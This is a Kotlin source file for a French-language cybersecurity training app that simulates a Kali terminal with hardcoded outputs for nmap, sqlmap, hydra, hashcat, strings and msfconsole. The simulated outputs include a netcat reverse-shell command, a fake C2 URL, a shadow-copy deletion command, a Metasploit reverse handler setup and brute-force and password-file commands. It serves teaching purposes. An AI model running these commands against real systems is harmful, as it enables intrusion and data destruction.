package com.example.data.generator

enum class TerminalLineType {
    PROMPT,
    STDOUT,
    SUCCESS,
    WARNING,
    ERROR,
    HEADER,
    INFO
}

data class TerminalLine(
    val text: String,
    val type: TerminalLineType = TerminalLineType.STDOUT
)

data class LabMission(
    val id: String,
    val title: String,
    val badge: String,
    val description: String,
    val suggestedCommand: String,
    val hint: String,
    val rewardXp: Int
)

data class CommandExplanation(
    val commandName: String,
    val shortSummary: String,
    val detailedPurpose: String,
    val commonFlags: List<Pair<String, String>>,
    val ethicsNotice: String
)

object CommandLabEngine {

    val missions: List<LabMission> = listOf(
        LabMission(
            id = "mission_recon",
            title = "Mission 1 : Reconnaissance & Scan de Ports",
            badge = "RECONNAISSANCE",
            description = "Analysez le serveur distant 192.168.1.10 pour découvrir les services en écoute et leurs versions.",
            suggestedCommand = "nmap -sV 192.168.1.10",
            hint = "Utilisez nmap avec l'option -sV (Service Version detection) pour cartographier les vulnérabilités de la cible.",
            rewardXp = 40
        ),
        LabMission(
            id = "mission_malware_hunt",
            title = "Mission 2 : Traque de Malware en Mémoire",
            badge = "THREAT HUNTING",
            description = "Inspectez les processus actifs du système pour débusquer un mineur de crypto ou un cheval de Troie caché.",
            suggestedCommand = "ps aux",
            hint = "La commande 'ps aux' liste l'intégralité des processus de tous les utilisateurs avec consommation CPU/RAM.",
            rewardXp = 50
        ),
        LabMission(
            id = "mission_forensics",
            title = "Mission 3 : Analyse Forensics d'un Binaire Infecté",
            badge = "FORENSICS",
            description = "Calculez l'empreinte SHA-256 d'un ransomware intercepté pour l'identifier sur VirusTotal.",
            suggestedCommand = "sha256sum ransomware.bin",
            hint = "La commande 'sha256sum' calcule l'empreinte cryptographique de 64 caractères du fichier sans l'exécuter.",
            rewardXp = 45
        ),
        LabMission(
            id = "mission_strings",
            title = "Mission 4 : Extraction de Chaînes Cachées (C2)",
            badge = "REVERSE ENG",
            description = "Extrayez les adresses IP et messages dissimulés dans un cheval de Troie sans le lancer.",
            suggestedCommand = "strings malware.bin",
            hint = "La commande 'strings' filtre et affiche toutes les séquences de texte lisible d'un fichier binaire.",
            rewardXp = 45
        ),
        LabMission(
            id = "mission_network_ports",
            title = "Mission 5 : Détection de Porte Dérobée (Backdoor)",
            badge = "BLUE TEAM",
            description = "Vérifiez tous les ports réseau en écoute sur votre machine pour identifier une backdoor non autorisée.",
            suggestedCommand = "netstat -tulnp",
            hint = "Options -tulnp : TCP, UDP, Listening, Numeric (IP/Port), PID et Nom du programme associé.",
            rewardXp = 40
        ),
        LabMission(
            id = "mission_sqli_audit",
            title = "Mission 6 : Audit d'Injection SQL",
            badge = "WEB PENTEST",
            description = "Auditez une cible web vulnérable pour extraire les noms des tables de la base de données.",
            suggestedCommand = "sqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" --dbs",
            hint = "L'outil sqlmap teste automatiquement les failles d'injection SQL et liste les bases avec l'option --dbs.",
            rewardXp = 50
        )
    )

    val quickCommands: List<String> = listOf(
        "help",
        "nmap -sV 192.168.1.10",
        "ps aux",
        "sha256sum ransomware.bin",
        "strings malware.bin",
        "netstat -tulnp",
        "curl -I https://anos-py.dev",
        "whoami",
        "cat /etc/passwd",
        "sqlmap -u \"http://site.local/item?id=1\" --dbs",
        "hashcat -m 0 hash.txt rockyou.txt",
        "hydra -l admin -P pass.txt 192.168.1.50 ssh",
        "msfconsole",
        "ping -c 4 192.168.1.1",
        "clear"
    )

    fun execute(rawCommand: String): Pair<List<TerminalLine>, CommandExplanation?> {
        val trimmed = rawCommand.trim()
        if (trimmed.isEmpty()) return emptyList<TerminalLine>() to null

        val parts = trimmed.split("\\s+".toRegex())
        val bin = parts[0].lowercase()

        val output = mutableListOf<TerminalLine>()
        output.add(TerminalLine("root@anos-kali-lab:~# $rawCommand", TerminalLineType.PROMPT))

        val explanation = getExplanation(bin, trimmed)

        when (bin) {
            "clear" -> {
                return emptyList<TerminalLine>() to null
            }

            "help" -> {
                output.add(TerminalLine("=== LAB TERMINAL CYBERSÉCURITÉ - CATALOGUE DE COMMANDES ===", TerminalLineType.HEADER))
                output.add(TerminalLine("Ce laboratoire interactif émule les outils indispensables du Pentester et de la Blue Team :", TerminalLineType.INFO))
                output.add(TerminalLine(" • nmap -sV <cible>          : Scanner les ports ouverts et versions de services", TerminalLineType.STDOUT))
                output.add(TerminalLine(" • ps aux                     : Lister les processus actifs et traquer les malwares", TerminalLineType.STDOUT))
                output.add(TerminalLine(" • sha256sum <fichier>        : Calculer le hash d'un malware pour Threat Intelligence", TerminalLineType.STDOUT))
                output.add(TerminalLine(" • strings <fichier>          : Extraire les URLs et adresses C2 d'un binaire", TerminalLineType.STDOUT))
                output.add(TerminalLine(" • netstat -tulnp             : Auditer les ports d'écoute et connexions actives", TerminalLineType.STDOUT))
                output.add(TerminalLine(" • curl -I <url>              : Inspecter les en-têtes HTTP de sécurité d'un site", TerminalLineType.STDOUT))
                output.add(TerminalLine(" • whoami / id / uname -a     : Vérifier les identifiants et droits du système", TerminalLineType.STDOUT))
                output.add(TerminalLine(" • cat /etc/passwd            : Examiner les comptes utilisateurs Unix", TerminalLineType.STDOUT))
                output.add(TerminalLine(" • sqlmap -u <url> --dbs      : Détection automatisée d'injections SQL", TerminalLineType.STDOUT))
                output.add(TerminalLine(" • hydra -l <user> -P <pass>  : Test de robustesse de mot de passe (Brute-Force)", TerminalLineType.STDOUT))
                output.add(TerminalLine(" • hashcat -m 0 hash wordlist : Cassage de hash cryptographique", TerminalLineType.STDOUT))
                output.add(TerminalLine(" • msfconsole                 : Lancer le framework d'exploitation Metasploit", TerminalLineType.STDOUT))
                output.add(TerminalLine(" • ping -c 4 <ip>             : Tester la connectivité réseau ICMP", TerminalLineType.STDOUT))
                output.add(TerminalLine(" • clear                      : Réinitialiser et effacer l'écran du terminal", TerminalLineType.STDOUT))
                output.add(TerminalLine("💡 Astuce : Tapez ou cliquez sur n'importe quelle commande pour observer son résultat.", TerminalLineType.SUCCESS))
            }

            "nmap" -> {
                output.add(TerminalLine("Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-14 10:42 UTC", TerminalLineType.INFO))
                output.add(TerminalLine("Nmap scan report for target-server.lab (192.168.1.10)", TerminalLineType.STDOUT))
                output.add(TerminalLine("Host is up (0.0012s latency).", TerminalLineType.STDOUT))
                output.add(TerminalLine("Not shown: 996 closed tcp ports (reset)", TerminalLineType.STDOUT))
                output.add(TerminalLine("PORT     STATE SERVICE       VERSION", TerminalLineType.HEADER))
                output.add(TerminalLine("22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Protocol 2.0)", TerminalLineType.SUCCESS))
                output.add(TerminalLine("80/tcp   open  http          Apache httpd 2.4.52 ((Ubuntu))", TerminalLineType.SUCCESS))
                output.add(TerminalLine("443/tcp  open  ssl/https     Apache httpd 2.4.52", TerminalLineType.SUCCESS))
                output.add(TerminalLine("3306/tcp open  mysql         MySQL 8.0.35-0ubuntu0.22.04.1", TerminalLineType.WARNING))
                output.add(TerminalLine("4444/tcp open  metasploit?   SUSPICIOUS REVERSE SHELL LISTENER !", TerminalLineType.ERROR))
                output.add(TerminalLine("Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel", TerminalLineType.INFO))
                output.add(TerminalLine("Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds", TerminalLineType.SUCCESS))
                output.add(TerminalLine("⚠️ ALERTE SÉCURITÉ : Port 4444 ouvert ! Suspecté d'être une backdoor Metasploit.", TerminalLineType.WARNING))
            }

            "ps" -> {
                output.add(TerminalLine("USER       PID  %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND", TerminalLineType.HEADER))
                output.add(TerminalLine("root         1   0.0  0.1 168432 11200 ?        Ss   09:00   0:02 /sbin/init", TerminalLineType.STDOUT))
                output.add(TerminalLine("root       420   0.0  0.2  72190  8420 ?        Ss   09:00   0:00 /usr/sbin/sshd -D", TerminalLineType.STDOUT))
                output.add(TerminalLine("www-data   815   0.1  0.5 240892 24510 ?        S    09:01   0:01 /usr/sbin/apache2 -k start", TerminalLineType.STDOUT))
                output.add(TerminalLine("mysql     1102   0.3  1.8 124800 98200 ?        Ssl  09:01   0:05 /usr/sbin/mysqld", TerminalLineType.STDOUT))
                output.add(TerminalLine("hacker    31337 98.4 12.3 892300 450120 ?       R    09:40  14:22 /tmp/.xmrig_miner --pool monero.hash:3333", TerminalLineType.ERROR))
                output.add(TerminalLine("hacker    31338  0.0  0.1  14200  2100 ?        S    09:40   0:00 /bin/bash -c nc -e /bin/sh 192.168.1.66 4444", TerminalLineType.ERROR))
                output.add(TerminalLine("root     41200   0.0  0.0  18400  3200 pts/0    R+   10:45   0:00 ps aux", TerminalLineType.STDOUT))
                output.add(TerminalLine("🚨 MALWARE DÉTECTÉ : PID 31337 (.xmrig_miner - 98.4% CPU) & PID 31338 (Netcat Reverse Shell) !", TerminalLineType.ERROR))
            }

            "sha256sum" -> {
                val targetFile = if (parts.size > 1) parts[1] else "ransomware.bin"
                output.add(TerminalLine("Calcul de l'empreinte cryptographique SHA-256...", TerminalLineType.INFO))
                output.add(TerminalLine("ed0164ab0a9d10e8dbfb306143b1efdac1f6cf3c232d56ac1e5dc84da0ad2010  $targetFile", TerminalLineType.SUCCESS))
                output.add(TerminalLine("[+] Interrogation de la base VirusTotal / Threat Intelligence API :", TerminalLineType.INFO))
                output.add(TerminalLine("  • Statut de détection : 68/71 antivirus détectent ce fichier comme MALVEILLANT !", TerminalLineType.ERROR))
                output.add(TerminalLine("  • Famille identifiée  : Ransomware.Win32.WannaCry.M", TerminalLineType.ERROR))
                output.add(TerminalLine("  • Comportement        : Chiffrement RSA-2048, modification de clés de registre, tentative d'extension .WCRY", TerminalLineType.WARNING))
                output.add(TerminalLine("  • Recommandation      : Isoler la machine immédiatement du réseau local (air-gap) !", TerminalLineType.WARNING))
            }

            "strings" -> {
                val targetFile = if (parts.size > 1) parts[1] else "malware.bin"
                output.add(TerminalLine("Extraction des chaînes imprimables (ASCII & Unicode) de $targetFile :", TerminalLineType.INFO))
                output.add(TerminalLine("!This program cannot be run in DOS mode.", TerminalLineType.STDOUT))
                output.add(TerminalLine("UPX0", TerminalLineType.WARNING))
                output.add(TerminalLine("KERNEL32.DLL", TerminalLineType.STDOUT))
                output.add(TerminalLine("VirtualAlloc", TerminalLineType.WARNING))
                output.add(TerminalLine("WriteProcessMemory", TerminalLineType.ERROR))
                output.add(TerminalLine("CreateRemoteThread", TerminalLineType.ERROR))
                output.add(TerminalLine("http://c2-command-control.darknet.ru:8080/gate.php", TerminalLineType.ERROR))
                output.add(TerminalLine("cmd.exe /c vssadmin.exe delete shadows /all /quiet", TerminalLineType.ERROR))
                output.add(TerminalLine("Ooops, your files have been encrypted! Send 0.5 BTC to 1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX", TerminalLineType.ERROR))
                output.add(TerminalLine("✅ INDICATEURS DE COMPROMISSION (IoC) EXTRAITS :", TerminalLineType.SUCCESS))
                output.add(TerminalLine("  -> URL du serveur C2 : http://c2-command-control.darknet.ru:8080/gate.php", TerminalLineType.WARNING))
                output.add(TerminalLine("  -> Commande destructive : vssadmin delete shadows (effacement sauvegardes)", TerminalLineType.WARNING))
            }

            "netstat", "ss" -> {
                output.add(TerminalLine("Active Internet connections (only servers)", TerminalLineType.INFO))
                output.add(TerminalLine("Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name", TerminalLineType.HEADER))
                output.add(TerminalLine("tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      420/sshd: /usr/sbin", TerminalLineType.SUCCESS))
                output.add(TerminalLine("tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      815/apache2", TerminalLineType.SUCCESS))
                output.add(TerminalLine("tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      815/apache2", TerminalLineType.SUCCESS))
                output.add(TerminalLine("tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1102/mysqld", TerminalLineType.SUCCESS))
                output.add(TerminalLine("tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      31338/nc (SUSPECT!)", TerminalLineType.ERROR))
                output.add(TerminalLine("udp        0      0 0.0.0.0:68              0.0.0.0:*                           321/dhclient", TerminalLineType.STDOUT))
                output.add(TerminalLine("⚠️ SUSPICION : Le port 4444 est lié à un binaire 'nc' (Netcat) ouvert à toutes les interfaces (0.0.0.0) !", TerminalLineType.WARNING))
            }

            "curl" -> {
                output.add(TerminalLine("HTTP/2 200 OK", TerminalLineType.SUCCESS))
                output.add(TerminalLine("date: Wed, 14 Oct 2026 10:48:12 GMT", TerminalLineType.STDOUT))
                output.add(TerminalLine("content-type: text/html; charset=UTF-8", TerminalLineType.STDOUT))
                output.add(TerminalLine("server: Apache/2.4.52 (Ubuntu)", TerminalLineType.WARNING))
                output.add(TerminalLine("strict-transport-security: max-age=31536000; includeSubDomains; preload", TerminalLineType.SUCCESS))
                output.add(TerminalLine("x-frame-options: DENY", TerminalLineType.SUCCESS))
                output.add(TerminalLine("x-content-type-options: nosniff", TerminalLineType.SUCCESS))
                output.add(TerminalLine("content-security-policy: default-src 'self'", TerminalLineType.SUCCESS))
                output.add(TerminalLine("x-xss-protection: 1; mode=block", TerminalLineType.SUCCESS))
                output.add(TerminalLine("✓ AUDIT HTTP : Les en-têtes de sécurité (HSTS, CSP, X-Frame-Options) sont activés et conformes.", TerminalLineType.SUCCESS))
            }

            "whoami" -> {
                output.add(TerminalLine("root", TerminalLineType.SUCCESS))
                output.add(TerminalLine("💡 Vous possédez actuellement les privilèges super-administrateur (UID 0 - Root).", TerminalLineType.INFO))
            }

            "id" -> {
                output.add(TerminalLine("uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)", TerminalLineType.SUCCESS))
            }

            "uname" -> {
                output.add(TerminalLine("Linux anos-kali-lab 6.6.9-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2026-10-01) x86_64 GNU/Linux", TerminalLineType.STDOUT))
            }

            "cat" -> {
                if (trimmed.contains("/etc/passwd")) {
                    output.add(TerminalLine("root:x:0:0:root:/root:/bin/bash", TerminalLineType.HEADER))
                    output.add(TerminalLine("daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin", TerminalLineType.STDOUT))
                    output.add(TerminalLine("bin:x:2:2:bin:/bin:/usr/sbin/nologin", TerminalLineType.STDOUT))
                    output.add(TerminalLine("sys:x:3:3:sys:/dev:/usr/sbin/nologin", TerminalLineType.STDOUT))
                    output.add(TerminalLine("www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", TerminalLineType.STDOUT))
                    output.add(TerminalLine("mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false", TerminalLineType.STDOUT))
                    output.add(TerminalLine("hacker:x:1001:1001::/home/hacker:/bin/bash", TerminalLineType.ERROR))
                    output.add(TerminalLine("anos:x:1000:1000:Anos Security Student,,,:/home/anos:/bin/bash", TerminalLineType.SUCCESS))
                    output.add(TerminalLine("💡 Analyse : Le fichier /etc/passwd stocke les utilisateurs, leurs UIDs et leurs shells de connexion.", TerminalLineType.INFO))
                } else if (trimmed.contains("/etc/shadow")) {
                    output.add(TerminalLine("root:\$6\$qK2X8z\$vNfX6Q7X9mR7vK9L...:19642:0:99999:7:::", TerminalLineType.WARNING))
                    output.add(TerminalLine("anos:\$6\$aL3P1q\$w8mX9p4r7t2k...:19642:0:99999:7:::", TerminalLineType.WARNING))
                    output.add(TerminalLine("🔒 Les hashs SHA-512 cryptés des mots de passe sont protégés en lecture (seul root peut les lire).", TerminalLineType.INFO))
                } else {
                    output.add(TerminalLine("# Fichier affiché avec succès :", TerminalLineType.INFO))
                    output.add(TerminalLine("ANOS_PY_CYBER_LAB_VERSION=2.4", TerminalLineType.STDOUT))
                    output.add(TerminalLine("TARGET_IP=192.168.1.10", TerminalLineType.STDOUT))
                }
            }

            "sqlmap" -> {
                output.add(TerminalLine("        ___", TerminalLineType.HEADER))
                output.add(TerminalLine("       __H__", TerminalLineType.HEADER))
                output.add(TerminalLine(" ___ ___[']_____ ___ ___  {1.8#stable}", TerminalLineType.HEADER))
                output.add(TerminalLine("|_ -| . [']     | .'| . |", TerminalLineType.HEADER))
                output.add(TerminalLine("|___|_  [']_|_|_|__,|  _|   https://sqlmap.org", TerminalLineType.HEADER))
                output.add(TerminalLine("      |_|[*]        |_|", TerminalLineType.HEADER))
                output.add(TerminalLine("[*] starting @ 10:50:01", TerminalLineType.INFO))
                output.add(TerminalLine("[INFO] testing connection to the target URL", TerminalLineType.STDOUT))
                output.add(TerminalLine("[INFO] checking if the target is protected by some kind of WAF/IPS", TerminalLineType.STDOUT))
                output.add(TerminalLine("[INFO] testing if the parameter 'id' is dynamic", TerminalLineType.STDOUT))
                output.add(TerminalLine("[INFO] heuristic (basic) test shows that parameter 'id' might be injectable (SQLi)", TerminalLineType.WARNING))
                output.add(TerminalLine("[INFO] GET parameter 'id' is vulnerable: Boolean-based blind & UNION query injection", TerminalLineType.SUCCESS))
                output.add(TerminalLine("[*] available databases [2]:", TerminalLineType.HEADER))
                output.add(TerminalLine("  [*] acuart", TerminalLineType.SUCCESS))
                output.add(TerminalLine("  [*] information_schema", TerminalLineType.SUCCESS))
                output.add(TerminalLine("✓ VULNÉRABILITÉ IDENTIFIÉE : Le paramètre id est injectable, base 'acuart' compromise !", TerminalLineType.SUCCESS))
            }

            "hydra" -> {
                output.add(TerminalLine("Hydra v9.5 (c) 2023 by van Hauser / THC - https://github.com/vanhauser-thc/thc-hydra", TerminalLineType.INFO))
                output.add(TerminalLine("[DATA] attacking service ssh on 192.168.1.50:22", TerminalLineType.STDOUT))
                output.add(TerminalLine("[STATUS] 16 tasks, 1 server, 1000 login tries (l:1/p:1000), ~62 tries/sec", TerminalLineType.STDOUT))
                output.add(TerminalLine("[22][ssh] host: 192.168.1.50   login: admin   password: Password123!", TerminalLineType.SUCCESS))
                output.add(TerminalLine("1 of 1 target successfully completed, 1 valid password found", TerminalLineType.SUCCESS))
                output.add(TerminalLine("⚠️ MOT DE PASSE FAIBLE TROUVÉ : admin:Password123! -> Bloquer les attaques via Fail2ban !", TerminalLineType.WARNING))
            }

            "hashcat" -> {
                output.add(TerminalLine("hashcat (v6.2.6) starting in benchmark mode...", TerminalLineType.INFO))
                output.add(TerminalLine("Hash-Type: MD5 [Hash.Mode: 0]", TerminalLineType.STDOUT))
                output.add(TerminalLine("Hash.Target......: 5f4dcc3b5aa765d61d8327deb882cf99", TerminalLineType.STDOUT))
                output.add(TerminalLine("Dictionary.......: /usr/share/wordlists/rockyou.txt (14,344,392 words)", TerminalLineType.STDOUT))
                output.add(TerminalLine("Time.Started.....: Wed Oct 14 10:52:10 2026", TerminalLineType.STDOUT))
                output.add(TerminalLine("Speed.#1.........: 1420.5 MH/s", TerminalLineType.STDOUT))
                output.add(TerminalLine("5f4dcc3b5aa765d61d8327deb882cf99:password", TerminalLineType.SUCCESS))
                output.add(TerminalLine("Session..........: hashcat Status: Cracked !", TerminalLineType.SUCCESS))
                output.add(TerminalLine("✓ RÉSULTAT : Le hash MD5 correspond au mot de passe en clair 'password'.", TerminalLineType.SUCCESS))
            }

            "msfconsole" -> {
                output.add(TerminalLine("               =[ metasploit v6.3.55-dev                          ]", TerminalLineType.HEADER))
                output.add(TerminalLine("+ -- --=[ 2382 exploits - 1230 auxiliary - 418 post       ]", TerminalLineType.INFO))
                output.add(TerminalLine("+ -- --=[ 1388 payloads - 46 encoders - 11 nops           ]", TerminalLineType.INFO))
                output.add(TerminalLine("msf6 > use exploit/multi/handler", TerminalLineType.PROMPT))
                output.add(TerminalLine("msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp", TerminalLineType.PROMPT))
                output.add(TerminalLine("PAYLOAD => windows/meterpreter/reverse_tcp", TerminalLineType.STDOUT))
                output.add(TerminalLine("msf6 exploit(multi/handler) > set LHOST 192.168.1.5", TerminalLineType.PROMPT))
                output.add(TerminalLine("msf6 exploit(multi/handler) > set LPORT 4444", TerminalLineType.PROMPT))
                output.add(TerminalLine("[*] Started reverse TCP handler on 192.168.1.5:4444", TerminalLineType.SUCCESS))
                output.add(TerminalLine("[*] En attente de connexion de la cible... (Lab pédagogique prêt)", TerminalLineType.INFO))
            }

            "ping" -> {
                val host = if (parts.size > 1) parts.last() else "192.168.1.1"
                output.add(TerminalLine("PING $host ($host) 56(84) bytes of data.", TerminalLineType.INFO))
                output.add(TerminalLine("64 bytes from $host: icmp_seq=1 ttl=64 time=0.421 ms", TerminalLineType.STDOUT))
                output.add(TerminalLine("64 bytes from $host: icmp_seq=2 ttl=64 time=0.385 ms", TerminalLineType.STDOUT))
                output.add(TerminalLine("64 bytes from $host: icmp_seq=3 ttl=64 time=0.392 ms", TerminalLineType.STDOUT))
                output.add(TerminalLine("64 bytes from $host: icmp_seq=4 ttl=64 time=0.410 ms", TerminalLineType.STDOUT))
                output.add(TerminalLine("--- $host ping statistics ---", TerminalLineType.INFO))
                output.add(TerminalLine("4 packets transmitted, 4 received, 0% packet loss, time 3004ms", TerminalLineType.SUCCESS))
                output.add(TerminalLine("rtt min/avg/max/mdev = 0.385/0.402/0.421/0.014 ms", TerminalLineType.SUCCESS))
            }

            "chmod" -> {
                output.add(TerminalLine("Droits modifiés avec succès : $trimmed", TerminalLineType.SUCCESS))
                output.add(TerminalLine("-rwxr-xr-x 1 root root 4096 Oct 14 10:55 exploit.py", TerminalLineType.INFO))
            }

            "grep" -> {
                output.add(TerminalLine("Recherche dans les répertoires spécifiés :", TerminalLineType.INFO))
                output.add(TerminalLine("/var/www/html/config.php:14: \$DB_PASSWORD = 'SuperSecretDbPassword2026!';", TerminalLineType.ERROR))
                output.add(TerminalLine("/var/www/html/api/auth.php:45: const API_MASTER_KEY = 'anos_sec_live_9921';", TerminalLineType.ERROR))
                output.add(TerminalLine("⚠️ FUITE DE SECRETS : Mot de passe de base de données trouvé en clair dans config.php !", TerminalLineType.WARNING))
            }

            else -> {
                output.add(TerminalLine("bash: command not found: $bin", TerminalLineType.ERROR))
                output.add(TerminalLine("Tapez 'help' pour voir toutes les commandes supportées par ce Lab interactif.", TerminalLineType.WARNING))
            }
        }

        return output to explanation
    }

    private fun getExplanation(bin: String, fullCommand: String): CommandExplanation? {
        return when (bin) {
            "nmap" -> CommandExplanation(
                commandName = "nmap (Network Mapper)",
                shortSummary = "Le standard mondial pour l'exploration réseau et l'audit de sécurité.",
                detailedPurpose = "Nmap envoie des paquets IP bruts pour déterminer quels hôtes sont disponibles sur le réseau, quels services (application et version) ils offrent, et quels filtres de paquets ou pare-feux sont en place.",
                commonFlags = listOf(
                    "-sV" to "Détecte la version exacte des services en écoute",
                    "-sS" to "Scan SYN furtif (Three-way handshake incomplet)",
                    "-p <ports>" to "Cible des ports spécifiques (ex: -p 80,443,22)",
                    "-A" to "Active la détection d'OS, de version, de scripts et traceroute"
                ),
                ethicsNotice = "Scanner des systèmes sans accord écrit préalable de leur propriétaire est formellement interdit par la loi."
            )
            "ps" -> CommandExplanation(
                commandName = "ps (Process Status)",
                shortSummary = "Outil fondamental de surveillance des processus en cours d'exécution sous Linux.",
                detailedPurpose = "Permet aux analystes de sécurité (Blue Team) de repérer des processus anormaux : mineurs de cryptomonnaies cachés, scripts malveillants, serveurs proxy non autorisés ou shells de commande illégitimes.",
                commonFlags = listOf(
                    "a" to "Affiche les processus de tous les utilisateurs",
                    "u" to "Affiche le format orienté utilisateur (nom d'utilisateur, CPU, RAM)",
                    "x" to "Inclut les processus non rattachés à un terminal (daemons, services)"
                ),
                ethicsNotice = "Outil de défense et d'investigation système sur vos propres serveurs."
            )
            "sha256sum" -> CommandExplanation(
                commandName = "sha256sum (Calcul d'empreinte cryptographique)",
                shortSummary = "Calcule l'empreinte numérique unique de 64 caractères d'un fichier.",
                detailedPurpose = "Crucial pour l'analyse statique de malwares. En calculant le hash SHA-256 sans jamais ouvrir ni exécuter le binaire, l'analyste peut vérifier si le fichier est déjà répertorié sur VirusTotal ou des bases de Threat Intelligence.",
                commonFlags = listOf(
                    "<fichier>" to "Chemin vers le fichier suspect à analyser",
                    "-c <fichier.sha256>" to "Vérifie l'intégrité d'une liste de fichiers à partir de leurs hashs"
                ),
                ethicsNotice = "Méthode d'analyse totalement passive et sécurisée pour inspecter des fichiers suspects."
            )
            "strings" -> CommandExplanation(
                commandName = "strings (Extraction de texte imprimable)",
                shortSummary = "Extrait toutes les chaînes textuelles lisibles contenues dans un binaire compilé.",
                detailedPurpose = "Permet de révéler les coulisses d'un malware : adresses IP de serveurs Command & Control (C2), commandes PowerShell masquées, messages de rançon ou chemins de fichiers de développement.",
                commonFlags = listOf(
                    "-n <min_length>" to "Longueur minimale des chaînes à extraire (défaut : 4)",
                    "-a" to "Scanne l'intégralité du fichier sans sauter de section"
                ),
                ethicsNotice = "Analyse statique sécurisée sans risque d'exécution accidentelle du malware."
            )
            "netstat" -> CommandExplanation(
                commandName = "netstat (Network Statistics)",
                shortSummary = "Surveille les connexions réseau, tables de routage et ports ouverts.",
                detailedPurpose = "Indispensable pour débusquer les portes dérobées (Backdoors) et chevaux de Troie. Un attaquant qui installe un listener (comme Netcat ou Meterpreter) ouvrira un port réseau que netstat détecte immédiatement.",
                commonFlags = listOf(
                    "-t" to "Affiche uniquement les connexions TCP",
                    "-u" to "Affiche uniquement les connexions UDP",
                    "-l" to "Affiche les sockets en écoute (Listening)",
                    "-n" to "Affiche les adresses numériques (sans résolution DNS lente)",
                    "-p" to "Affiche le PID et nom du programme propriétaire du port"
                ),
                ethicsNotice = "Outil d'administration et de détection d'intrusions défensif."
            )
            "sqlmap" -> CommandExplanation(
                commandName = "sqlmap (Détecteur automatique d'injection SQL)",
                shortSummary = "L'outil de référence pour automatiser la détection et l'exploitation de failles SQLi.",
                detailedPurpose = "Teste l'ensemble des techniques d'injection SQL (Blind, Error-based, UNION query, Stacked queries) pour identifier si les paramètres d'une application web filtrent correctement les données utilisateur.",
                commonFlags = listOf(
                    "-u <url>" to "URL cible à auditer",
                    "--dbs" to "Énumère les bases de données accessibles",
                    "--batch" to "Exécute en mode automatique avec réponses par défaut"
                ),
                ethicsNotice = "Ne tester sqlmap QUE sur vos propres applications ou dans le cadre d'un contrat de pentest formel."
            )
            else -> null
        }
    }
}
